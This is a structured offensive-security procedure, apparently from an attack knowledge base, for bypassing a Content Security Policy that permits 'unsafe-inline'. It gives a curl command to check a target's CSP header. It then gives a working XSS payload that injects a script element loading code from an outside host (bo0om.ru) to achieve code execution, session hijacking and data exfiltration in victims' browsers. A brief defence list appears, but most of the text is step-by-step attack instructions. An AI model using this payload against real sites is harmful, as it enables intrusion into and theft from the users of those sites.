---
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Defense Evasion]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - csp-bypass
  - xss
  - unsafe-inline
commands:
  - '[[commands/curl-fetch-csp-header]]'
tools: []
platforms:
  - web
verified: true
validated: true
---

# CSP-Bypass-via-Unsafe-Inline-Script-Injection

## Summary

This procedure exploits a Content Security Policy (CSP) misconfiguration that permits 'unsafe-inline' by injecting JavaScript code to dynamically load and execute an external script, allowing arbitrary code execution in the victim's browser. This bypasses restrictions on script sources and can lead to cross-site scripting (XSS) attacks for data theft or further exploitation.

## Description

Content Security Policy (CSP) is a browser security mechanism that restricts the sources from which content like scripts can load, aiming to mitigate XSS attacks. However, including 'unsafe-inline' in the policy (e.g., in script-src or default-src) allows inline scripts to execute without additional protections like nonces or hashes. An attacker can exploit this by injecting JavaScript via an XSS vulnerability or reflected input, using DOM manipulation to create and append a script element that loads external malicious code. This technique is effective against sites with weak CSP configurations and can result in session hijacking, credential theft, or malware delivery. The target environment is typically a web application with user-controlled inputs that reflect unsanitized content back to the page.

## Requirements

1. Identification of an XSS vulnerability or input field that reflects user input without proper sanitization.
2. Confirmation that the target's CSP policy includes 'unsafe-inline' directive.
3. Network access to the target web application.
4. Tools for inspecting HTTP headers (e.g., curl) and injecting payloads (e.g., browser developer tools or Burp Suite).

## Defense

- Implement strict CSP policies using nonces, hashes, or strict-dynamic instead of 'unsafe-inline'.
- Sanitize and validate all user inputs to prevent XSS, using output encoding for reflected content.
- Regularly audit CSP headers and test for bypasses with tools like CSP Evaluator.
- Enable Content-Security-Policy-Report-Only mode for monitoring violations without blocking.

## Objectives

1. Verify the presence of 'unsafe-inline' in the CSP to confirm exploitability.
2. Inject JavaScript to load and execute external malicious code in the victim's browser.
3. Achieve arbitrary code execution for data exfiltration or session manipulation.
4. Demonstrate persistence or lateral movement via executed scripts.

## Instructions

### Step 1: Verify CSP Policy Allows Unsafe Inline

**Context**: Before attempting injection, confirm the target's CSP header permits 'unsafe-inline', which enables inline script execution. This step uses a command to fetch and inspect the header.

**Command** ([[commands/curl-fetch-csp-header]]):
```bash
curl -s -I https://$_TARGET_URL | grep -i content-security-policy
```

> This command sends a HEAD request to the target URL and filters for the CSP header. Look for 'unsafe-inline' in the output to validate the misconfiguration. If absent, the bypass may not work without additional techniques.

### Step 2: Inject JavaScript Payload to Load External Script

**Context**: Locate a vulnerable input (e.g., search parameter or form field) that reflects content. Craft an XSS payload using the provided code snippet to dynamically create a script element and load an external resource. Submit the payload through the vulnerable endpoint.

**Code** ([[codes/javascript-dynamic-script-injection]]):
```js
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```

> Inject this JavaScript as the payload (e.g., via URL parameter: ?q=<script>above code</script>). The code executes in the browser, creating a new script tag that appends to the document head, loading and running the external script if CSP allows the inline creation. Success is indicated by the external script executing (e.g., alert or network request to attacker's domain).

### Step 3: Validate Execution and Exfiltrate Data

**Context**: After injection, monitor for successful execution. Use browser developer tools or a proxy to observe network activity or DOM changes confirming the script ran.

**Instructions**: Refresh the page with the injected payload and check the console for errors or execution traces. If the external script performs an action (e.g., beaconing to attacker server), verify receipt on the listener.

> No specific command here; use manual verification. Expected signs include new network requests or DOM modifications.
